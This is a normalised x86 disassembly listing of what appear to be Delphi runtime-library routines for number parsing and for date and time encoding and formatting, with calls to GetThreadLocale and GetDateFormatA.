mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409734
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4097eb
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4097f6
neg edx
mov ecx esi
call sub_4097f6
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4097eb
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409812
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402dfc
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4097f6
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409812
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409848
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_409234
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404128
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409878
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_409234
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404128
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4098c4
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044f8
mov edx esp
xor ecx ecx
call sub_409734
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4098f0
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044f8
mov edx esp
xor ecx ecx
call sub_409734
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409938
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_40997c
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4099ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409938
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407e68
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407e68
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407e68
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409a48
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409a84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409a48
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409b4c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409938
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407e68
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407e68
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407e68
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409a48
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409c98
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409b4c
pop esi
pop ecx
pop ebp
retn 0x8
sub_409cb8
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409938
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409cf4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028c8
sub_409d38
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4042f8
mov edx eax
mov eax ebx
call sub_409cf4
pop ecx
pop ebx
pop ebp
retn
sub_409d58
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408d24
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409cf4
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409da4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409dd0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409c98
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409e08
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4099ec
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409e48
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409f96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404038
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040d0
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409f9d
lea eax [ ebp - 0x118 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4042a8
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4042f8
mov edx eax
mov eax [ ebx ]
call sub_40c3c8
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c53c
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404558
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c4d8
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404230
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c53c
mov ecx eax
mov eax ebx
mov edx esi
call sub_404128
sub_409fb0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a08e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404038
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040d0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040d0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a095
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4042a8
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4042f8
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404558
sub_40a0b8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a839
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a840
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_40405c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c5bc
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c59c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409cf4
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c5bc
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409cf4
pop ecx
mov al [ eax + lookup_table_40a19b ]
jmp [ eax * 4 + jump_table_40a1d4 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409da4
pop ecx
push ebp
call sub_409dd0
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409da4
pop ecx
push ebp
call sub_409dd0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409e48
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409d38
pop ecx
jmp r-xdata
push ebp
call sub_409da4
pop ecx
push ebp
call sub_409dd0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409fb0
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409d38
pop ecx
jmp r-xdata
push ebp
call sub_409da4
pop ecx
push ebp
call sub_409dd0
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409da4
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409da4
pop ecx
push ebp
call sub_409e08
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409da4
pop ecx
push ebp
call sub_409e08
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409da4
pop ecx
push ebp
call sub_409e08
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409da4
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409da4
pop ecx
push ebp
call sub_409e08
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409e08
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408b80
test eax eax
jne r-xdata
push ebp
call sub_409da4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0b8
pop ecx
push ebp
call sub_409e08
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409d58
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409d58
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409d58
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409dd0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409d58
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409d58
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409d58
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0b8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0b8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409d58
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408b80
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409cf4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0b8
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409cf4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409cf4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409d38
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409cb8
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d38
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408b80
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409cf4
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409cf4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409d38
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409cb8
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d38
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c5bc
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408b80
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409cf4
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0b8
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409d58
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408b80
test eax eax
jne r-xdata
push ebp
call sub_409dd0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409cb8
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d38
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d38
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d38
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c5bc
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0b8
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409cf4
pop ecx
jmp r-xdata
push ebp
call sub_409dd0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409cb8
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d38
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408b80
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408b80
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408b80
test eax eax
jne r-xdata
jmp r-xdata
sub_40a86c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a0b8
pop ecx
push ebp
mov eax ebx
call sub_40a0b8
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404128
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a8dc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4042f8
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
